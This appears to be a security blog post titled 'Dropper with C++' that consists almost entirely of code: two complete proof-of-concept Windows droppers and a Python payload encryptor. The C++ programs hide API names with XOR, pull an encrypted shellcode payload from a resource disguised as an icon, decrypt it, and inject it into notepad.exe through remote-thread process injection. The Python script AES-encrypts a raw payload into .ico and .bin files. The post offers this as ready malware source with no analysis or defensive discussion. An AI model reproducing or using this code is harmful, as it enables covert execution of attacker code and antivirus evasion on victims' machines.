---
title: "Dropper with C++"
published: 2022-02-02   
description: ""
image: ""
tags:
  - "WindowsInternal"
category: "Cybersecurity"
draft: false 
lang: "en"
---

## **Full POC 1**
```cpp
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"


void XOR(char * data, size_t data_len, char * key, size_t key_len){
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

HANDLE(WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID); //Kernel32.dll
BOOL(WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe); //Kernel32.dll
BOOL(WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe); //Kernel32.dll
BOOL(WINAPI * pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect); //Kernel32.dll
LPVOID(WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); //Kernel32.dll

BOOL(WINAPI * pCloseHandle)(HANDLE hObject); //Kernel32.dll
BOOL(WINAPI * pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten); //Kernel32.dll
HANDLE(WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD(WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds); //Kernel32.dll
HANDLE(WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); //Kernel32.dll
HRSRC (WINAPI * pFindResource)(HMODULE hModule,LPCSTR  lpName,LPCSTR  lpType);//Kernel32.dll
HGLOBAL (WINAPI * pLoadResource)(HMODULE hModule,HRSRC hResInfo);//Kernel32.dll
LPVOID (WINAPI * pLockResource)(HGLOBAL hResData);//Kernel32.dll
DWORD (WINAPI * pSizeofResource)(HMODULE hModule,HRSRC hResInfo);//Kernel32.dll
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination,const VOID UNALIGNED *Source,SIZE_T  Length);//Kernel32.dll
LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);//Kernel32.dll


char key[] = "mysecretkeee";
char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
char sProcess32First[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x23, 0xc, 0x17, 0x1e, 0xd };
char sCloseHandle[] = { 0x2e, 0x15, 0x1c, 0x16, 0x6, 0x3a, 0x4, 0x1a, 0xf, 0x9, 0x0 };
char sProcess32Next[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x2b, 0x0, 0x1d, 0x19 };
char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11 };
char sFindResourceA[] = { 0x2b, 0x10, 0x1d, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0, 0x2c };
char sLoadResource[] = { 0x21, 0x16, 0x12, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0 };
char sLockResource[] = { 0x21, 0x16, 0x10, 0xe, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0 };
char sSizeofResource[] = { 0x3e, 0x10, 0x9, 0x0, 0xc, 0x14, 0x37, 0x11, 0x18, 0xa, 0x10, 0x17, 0xe, 0x1c };
char sVirtualAlloc[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6 };
char sRtlMoveMemory[] = { 0x3f, 0xd, 0x1f, 0x28, 0xc, 0x4, 0x0, 0x39, 0xe, 0x8, 0xa, 0x17, 0x14 };
char sOpenProcess[] = { 0x22, 0x9, 0x16, 0xb, 0x33, 0x0, 0xa, 0x17, 0xe, 0x16, 0x16 };
char skernel32[] = "kernel32.dll";
char sNtdll[] = "Ntdll.dll";

char sCreateToolhelp32Snapshot[] = "CreateToolhelp32Snapshot";

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

		XOR((char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));
		XOR((char *) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));
		XOR((char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));


		pProcess32First = GetProcAddress(GetModuleHandle(skernel32), sProcess32First);
		pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
		pProcess32Next = GetProcAddress(GetModuleHandle(skernel32), sProcess32Next);

		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(skernel32), sCreateToolhelp32Snapshot);

                
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;		

		XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		XOR((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
		XOR((char *) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));

		pVirtualAllocEx = GetProcAddress(GetModuleHandle(skernel32), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(skernel32), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(skernel32), sCreateRemoteThread);
		pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(skernel32), sWaitForSingleObject);

        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow){    

	void *exec_mem;
	BOOL rv;
	HANDLE th, hProc = NULL;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	int pid = 0;
	unsigned char * payload;
	unsigned int payload_len;

	XOR((char *) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
	XOR((char *) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
	XOR((char *) sSizeofResource, sizeof(sSizeofResource), key, sizeof(key));
	XOR((char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	XOR((char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
	XOR((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), key, sizeof(key));

	pFindResource = GetProcAddress(GetModuleHandle(skernel32), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle(skernel32), sLoadResource);
	pSizeofResource = GetProcAddress(GetModuleHandle(skernel32), sSizeofResource);
	pLockResource = GetProcAddress(GetModuleHandle(skernel32), sLockResource);
	pVirtualAlloc = GetProcAddress(GetModuleHandle(skernel32), sVirtualAlloc);
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sNtdll), sRtlMoveMemory);
	pOpenProcess = GetProcAddress(GetModuleHandle(sNtdll), sOpenProcess);

	res = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (unsigned char *) pLockResource(resHandle);
	payload_len = pSizeofResource(NULL, res);
	

	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	pRtlMoveMemory(exec_mem, payload, payload_len);

	XOR((char *) exec_mem, payload_len, key, sizeof(key));

	pid = FindTarget("notepad.exe");
	printf("%d",pid);
	if (pid) {

		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		

		if (hProc != NULL) {
			Inject(hProc, exec_mem, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}
```

## **Encryptor**

```py
import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = '\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01'
def pad(s):
    pad_len = AES.block_size - len(s) % AES.block_size
    return s + bytes([pad_len] * pad_len)

def aesenc(plaintext, key):
    k = hashlib.sha256(key.encode('utf-8')).digest()
    iv = urandom(AES.block_size)
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return iv + ciphertext

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
open("msgBox.ico", "wb").write(ciphertext)
open("msgBox.bin", "wb").write(ciphertext)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
print('IV[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext[:16]) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext[16:]) + ' };')
```
## **Full POC**
```cpp

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"


#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")



HANDLE(WINAPI * pCreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID); //Kernel32.dll
BOOL(WINAPI * pProcess32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe); //Kernel32.dll
BOOL(WINAPI * pProcess32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe); //Kernel32.dll
BOOL(WINAPI * pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect); //Kernel32.dll
LPVOID(WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); //Kernel32.dll

BOOL(WINAPI * pCloseHandle)(HANDLE hObject); //Kernel32.dll
BOOL(WINAPI * pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten); //Kernel32.dll
HANDLE(WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD(WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds); //Kernel32.dll
HANDLE(WINAPI * pOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); //Kernel32.dll
HRSRC (WINAPI * pFindResource)(HMODULE hModule,LPCSTR  lpName,LPCSTR  lpType);//Kernel32.dll
HGLOBAL (WINAPI * pLoadResource)(HMODULE hModule,HRSRC hResInfo);//Kernel32.dll
LPVOID (WINAPI * pLockResource)(HGLOBAL hResData);//Kernel32.dll
DWORD (WINAPI * pSizeofResource)(HMODULE hModule,HRSRC hResInfo);//Kernel32.dll
VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination,const VOID UNALIGNED *Source,SIZE_T  Length);//// Ntdll.dll
LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);//Kernel32.dll



unsigned char key[] = "mysecretkeee";
unsigned char AESKEY[] = { 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1 };
unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1 };
unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb };
unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16 };
unsigned char sProcess32First[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x23, 0xc, 0x17, 0x1e, 0xd };
unsigned char sCloseHandle[] = { 0x2e, 0x15, 0x1c, 0x16, 0x6, 0x3a, 0x4, 0x1a, 0xf, 0x9, 0x0 };
unsigned char sProcess32Next[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x2b, 0x0, 0x1d, 0x19 };
unsigned char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11 };
unsigned char sFindResourceA[] = { 0x2b, 0x10, 0x1d, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0, 0x2c };
unsigned char sLoadResource[] = { 0x21, 0x16, 0x12, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0 };
unsigned char sLockResource[] = { 0x21, 0x16, 0x10, 0xe, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0 };
unsigned char sSizeofResource[] = { 0x3e, 0x10, 0x9, 0x0, 0xc, 0x14, 0x37, 0x11, 0x18, 0xa, 0x10, 0x17, 0xe, 0x1c };
unsigned char sVirtualAlloc[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6 };
unsigned char sRtlMoveMemory[] = { 0x3f, 0xd, 0x1f, 0x28, 0xc, 0x4, 0x0, 0x39, 0xe, 0x8, 0xa, 0x17, 0x14 };
unsigned char sOpenProcess[] = { 0x22, 0x9, 0x16, 0xb, 0x33, 0x0, 0xa, 0x17, 0xe, 0x16, 0x16 };
unsigned char skernel32[] = "kernel32.dll";
unsigned char sNtdll[] = "Ntdll.dll";

unsigned char sCreateToolhelp32Snapshot[] = "CreateToolhelp32Snapshot";
int FindTarget(const char *procname) ;
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len);
void XOR(char * data, size_t data_len, char * key, size_t key_len);
int AESDecrypt(char * payload, size_t payload_len, char * key, size_t keylen);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow){    

	void *exec_mem;
	BOOL rv;
	HANDLE th, hProc = NULL;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	int pid = 0;
	unsigned char * payload;
	unsigned int payload_len;

	XOR((unsigned char *) sFindResourceA, sizeof(sFindResourceA), key, sizeof(key));
	XOR((unsigned char *) sLoadResource, sizeof(sLoadResource), key, sizeof(key));
	XOR((unsigned char *) sSizeofResource, sizeof(sSizeofResource), key, sizeof(key));
	XOR((unsigned char *) sLockResource, sizeof(sLockResource), key, sizeof(key));
	XOR((unsigned char *) sVirtualAlloc, sizeof(sVirtualAlloc), key, sizeof(key));
	XOR((unsigned char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), key, sizeof(key));

	pFindResource = GetProcAddress(GetModuleHandle(skernel32), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle(skernel32), sLoadResource);
	pSizeofResource = GetProcAddress(GetModuleHandle(skernel32), sSizeofResource);
	pLockResource = GetProcAddress(GetModuleHandle(skernel32), sLockResource);
	pVirtualAlloc = GetProcAddress(GetModuleHandle(skernel32), sVirtualAlloc);
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sNtdll), sRtlMoveMemory);

	res = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payload = (unsigned char *) pLockResource(resHandle);
	payload_len = pSizeofResource(NULL, res);
	



	exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	pRtlMoveMemory(exec_mem, payload, payload_len);
	AESDecrypt((char *) exec_mem, payload_len, AESKEY, sizeof(AESKEY));
	char *execMem = (char *) exec_mem + 16;
	printf("%-20s : 0x%-016p\n", "exec addr", (void *)execMem);

	pid = FindTarget("notepad.exe");

	if (pid) {

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		

		if (hProc != NULL) {
			Inject(hProc, execMem, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

		XOR((unsigned char *) sProcess32First, sizeof(sProcess32First), key, sizeof(key));
		XOR((unsigned char *) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));
		XOR((unsigned char *) sProcess32Next, sizeof(sProcess32Next), key, sizeof(key));


		pProcess32First = GetProcAddress(GetModuleHandle(skernel32), sProcess32First);
		pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
		pProcess32Next = GetProcAddress(GetModuleHandle(skernel32), sProcess32Next);

		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(skernel32), sCreateToolhelp32Snapshot);

                
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;		

		XOR((unsigned char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
		XOR((unsigned char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
		XOR((unsigned char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key, sizeof(key));
		XOR((unsigned char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), key, sizeof(key));
		XOR((unsigned char *) sCloseHandle, sizeof(sCloseHandle), key, sizeof(key));

		pVirtualAllocEx = GetProcAddress(GetModuleHandle(skernel32), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(skernel32), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(skernel32), sCreateRemoteThread);
		pCloseHandle = GetProcAddress(GetModuleHandle(skernel32), sCloseHandle);
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(skernel32), sWaitForSingleObject);

        pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

void XOR(char * data, size_t data_len, char * key, size_t key_len){
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int AESDecrypt(char * payload, size_t payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}
```